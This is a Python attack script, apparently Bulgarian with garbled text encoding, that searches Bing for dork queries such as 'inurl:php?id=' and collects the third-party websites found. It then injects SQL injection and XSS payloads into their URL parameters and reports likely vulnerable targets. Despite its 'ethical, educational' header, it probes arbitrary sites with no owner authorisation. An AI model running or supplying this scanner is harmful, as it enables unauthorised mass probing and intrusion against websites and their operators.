"""
Vi Dork & Exploit Scanner v1.0
–ü—Ä–æ–µ–∫—Ç –Ω–∞ Vi Security Group ‚Äì –ó–∞ –µ—Ç–∏—á–Ω–æ —Å–∫–∞–Ω–∏—Ä–∞–Ω–µ –Ω–∞ Dork-—É—è–∑–≤–∏–º–æ—Å—Ç–∏
–ê–≤—Ç–æ—Ä: Vi Team
–õ–∏—Ü–µ–Ω–∑: –ó–∞ –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª–Ω–∏ —Ü–µ–ª–∏ –∏ –≤—ä—Ç—Ä–µ—à–Ω–∞ —É–ø–æ—Ç—Ä–µ–±–∞
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time

headers = {
    "User-Agent": "Mozilla/5.0"
}

# Dorks + –ø—Ä–∏—á–∏–Ω–∞ (–æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª–Ω–∞)
dorks = {
    'inurl:php?id=': '–ü–æ—Ç–µ–Ω—Ü–∏–∞–ª–Ω–∞ SQL –∏–Ω–∂–µ–∫—Ü–∏—è',
    'inurl:search.php?q=': '–ü–æ—Ç–µ–Ω—Ü–∏–∞–ª–Ω–∞ XSS –∏–Ω–∂–µ–∫—Ü–∏—è',
}

# Payload-–∏
sqli_payloads = ["' OR '1'='1", "\" OR \"1\"=\"1", "' UNION SELECT null--"]
xss_payloads = ["<script>alert(123)</script>", "\"><img src=x onerror=alert(1)>"]

# –¢—ä—Ä—Å–µ–Ω–µ –≤ Bing
def search_bing(query, pages=1):
    found_urls = []
    for p in range(pages):
        offset = p * 10
        url = f"https://www.bing.com/search?q={query}&first={offset}"
        r = requests.get(url, headers=headers)
        soup = BeautifulSoup(r.text, "html.parser")
        for a in soup.find_all('a', href=True):
            href = a['href']
            if href.startswith("http") and "bing.com" not in href:
                found_urls.append(href)
        time.sleep(1)
    return list(set(found_urls))

# –¢–µ—Å—Ç–≤–∞–π –∑–∞ SQLi –∏ XSS
def test_url(url):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    if not qs:
        return

    for param in qs:
        for payload in sqli_payloads + xss_payloads:
            test_qs = qs.copy()
            test_qs[param] = payload
            encoded_qs = urlencode(test_qs, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', encoded_qs, ''))
            try:
                resp = requests.get(test_url, headers=headers, timeout=10)
                body = resp.text.lower()
                if any(err in body for err in ['sql syntax', 'mysql', 'syntax error']):
                    print(f"[!] SQLi –≤–µ—Ä–æ—è—Ç–Ω–∞: {test_url}")
                if payload.lower() in body:
                    print(f"[!] XSS –≤–µ—Ä–æ—è—Ç–Ω–∞: {test_url}")
            except requests.exceptions.RequestException:
                continue

# –ì–ª–∞–≤–Ω–∞ —Ñ—É–Ω–∫—Ü–∏—è
def main():
    print("=== Vi Security Dork Scanner v1.0 ===")
    for dork, reason in dorks.items():
        print(f"üîç –¢—ä—Ä—Å–µ–Ω–µ –ø–æ Dork: {dork} ({reason})")
        urls = search_bing(dork, pages=1)
        for url in urls:
            print(f" - –û—Ç–∫—Ä–∏—Ç URL: {url}")
            test_url(url)

if __name__ == "__main__":
    main()